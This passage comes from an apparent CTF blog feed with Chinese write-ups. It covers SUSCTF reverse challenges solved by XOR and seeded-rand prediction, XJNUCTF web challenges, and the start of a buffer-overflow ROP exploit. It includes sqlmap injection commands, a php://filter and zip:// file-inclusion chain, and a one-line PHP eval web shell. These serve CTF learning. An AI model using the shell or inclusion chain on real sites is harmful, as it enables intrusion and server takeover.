        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something wrong, you should try harder."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congrazzzzzz~ You got it!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something wrong, you should try harder."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>分析代码 若要获得flag 需要将v4的每一位与v5的每一位xor操作 即可</p>
<p>EXP </p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">v4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span>
v5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">]</span>

str <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    str <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token punctuation">(</span>v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> str
</code></pre>
<p>运行即可</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>FLAG : SUSCTF{x0r_1s_e4sy_tO_r3ver5e}
</code></pre><h3 id="150-1"><a href="#150-1" class="headerlink" title="150"></a>150</h3><p><img src="/2018/10/29/SUSCTF-Writeup-Reverse/6.png" alt=""><br>载入IDA 分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-44h]</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-40h]</span>
  __int16 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+40h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+48h] [rbp-8h]</span>

  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Give me flag: "</span><span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">39</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">38</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">127</span> <span class="token operator">^</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> c_text<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Right"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>核心操作</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">38</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">127</span> <span class="token operator">^</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> c_text<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>   和上一题类似 只不过需要猜测随机数<br>   但是srand 可以预测 所以我们 先写一个随机数预测脚本</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span>
<span class="token function">intmain</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>

 <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">50</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d,"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>
</code></pre>
<p>EXP </p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">

c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x7B</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x4C</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x2B</span><span class="token punctuation">,</span><span class="token number">0xA</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x2C</span><span class="token punctuation">,</span><span class="token number">0xE</span><span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x5F</span><span class="token punctuation">,</span><span class="token number">0x2C</span><span class="token punctuation">,</span><span class="token number">0x3B</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x1F</span><span class="token punctuation">,</span><span class="token number">0x7E</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0xD</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0x5E</span><span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">]</span>
srand <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span>
str <span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    str <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>srand<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> str
</code></pre>
<pre><code>SUSCTF{rand0m_m4ybe_no7_saf3_sOmet1mes}
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;60&quot;&gt;&lt;a href=&quot;#60&quot; class=&quot;headerlink&quot; title=&quot;60&quot;&gt;&lt;/a&gt;60&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/2018/10/29/SUSCTF-Writeup-Reverse/1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;下载载入IDA
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XJNUCTF-Writeup</title>
    <link href="http://iosmosis.github.io/2018/10/04/XJNUCTF-Writeup/"/>
    <id>http://iosmosis.github.io/2018/10/04/XJNUCTF-Writeup/</id>
    <published>2018-10-04T09:57:59.000Z</published>
    <updated>2018-10-04T12:00:16.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/1.png" alt="1"></p>
<p>查看</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/2.png" alt="2"></p>
<p>得到提示 应该是注入</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/3.png" alt="3"></p>
<p>测试发现这里存在sql语句查询</p>
<p>所以用sqlmap这个工具跑一下就可以了</p>
<p>sqlmap.py -u “<a href="http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1&quot;" target="_blank" rel="noopener">http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1&quot;</a></p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/4.jpg" alt="4"></p>
<p>确实存在注入</p>
<p>sqlmap.py -u “<a href="http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1&quot;" target="_blank" rel="noopener">http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1&quot;</a> –tables</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/5.png" alt="5"></p>
<p>得到flag表 那我们dump出来看一下</p>
<p>sqlmap.py -u “<a href="http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1&quot;" target="_blank" rel="noopener">http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1&quot;</a> –dump -T flag</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/Users\TTTR\ios\source\_posts\XJNUCTF-Writeup\6.png" alt="6"></p>
<h3 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/7.png" alt="7"></p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/8.png" alt="8"></p>
<p>弹出提示 你不属于这里 </p>
<p>猜测需要伪造访问ip</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/9.png" alt="9"></p>
<p>配置好burp代理</p>
<p>抓包伪造ip</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/10.png" alt="10"></p>
<p>提示未登录 修改0为1</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/11.png" alt="11"></p>
<p>她会提示你用的不是iphone 999</p>
<p>利用谷歌浏览器模拟iphone客户端</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/12.png" alt="12"></p>
<p>抓包</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/13.png" alt="13"></p>
<p>得到iPhonex的地址</p>
<p>修改os版本</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/14.png" alt="14"></p>
<p>得到flag</p>
<h3 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/15.png" alt="15"></p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/16.png" alt="16"></p>
<p>提示 flag就在index.php中 但是没办法查看 猜测为git泄露</p>
<p>使用工具githack</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/17.png" alt="17"></p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/18.png" alt="18"></p>
<p>得到flag</p>
<h3 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/19.png" alt="19"></p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/20.png" alt="20"></p>
<p>发现url处存在文件包含</p>
<p>尝试读取upload.php源码</p>
<p></p><p class="code-caption" data-lang="php+html" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-php+html"><code class="language-php+html">http://ctf.xjnu.edu.cn:666/index.php?file=php://filter/read=convert.base64-encode/resource=upload.php
</code></pre>
<p><img src="/2018/10/04/XJNUCTF-Writeup/21.png" alt="21"></p>
<p>Base64解密即可得到源码</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/22.png" alt="22"></p>
<p>发现upload目录可任意读取下载,</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/23.png" alt="23"></p>
<p>打开得到源码</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/24.png" alt="24"></p>
<p>过滤了%00</p>
<p>这里用到了王松师傅的思路</p>
<p><a href="https://www.hackersb.cn/hacker/105.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/105.html</a></p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/25.png" alt="25"></p>
<p>测试创建一个php文件</p>
<p>接着压缩修改后缀名为 ss.png</p>
<p>Exp</p>
<p></p><p class="code-caption" data-lang="php+html" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-php+html"><code class="language-php+html">http://ctf.xjnu.edu.cn:666/index.php?file=zip://upload/ss.png%23he.html.php
</code></pre>
<p>成功执行命令</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/26.png" alt="26"></p>
<p>写入一句话</p>
<p></p><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>
</code></pre>
<p><img src="/2018/10/04/XJNUCTF-Writeup/27.png" alt="27"></p>
<p>成功拿到shell</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/28.png" alt="28"></p>
<p>成功拿到flag</p>
<h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-70h]</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞存在点</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"send success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>程序很简单 没有多余的流程 漏洞也很明显</p>
<p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec babypwn
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/babypwn'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
ubuntu@ubuntu:~$
</code></pre>
<p>NX开启 </p>
<p>思路：</p>
<p>通过溢出leak puts 从而得到libc版本 进而得到system地址及bin/sh地址 </p>
<p>偏移计算 offset = 0x70+8 </p>
<p>构造leak</p>
<p>寻找gadget</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary babypwn --only <span class="token string">"pop|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x000000000040071c <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040071e <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400720 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400722 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040071b <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040071f <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400595 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret
0x0000000000400723 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret  // 这里是我们需要的
0x0000000000400721 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
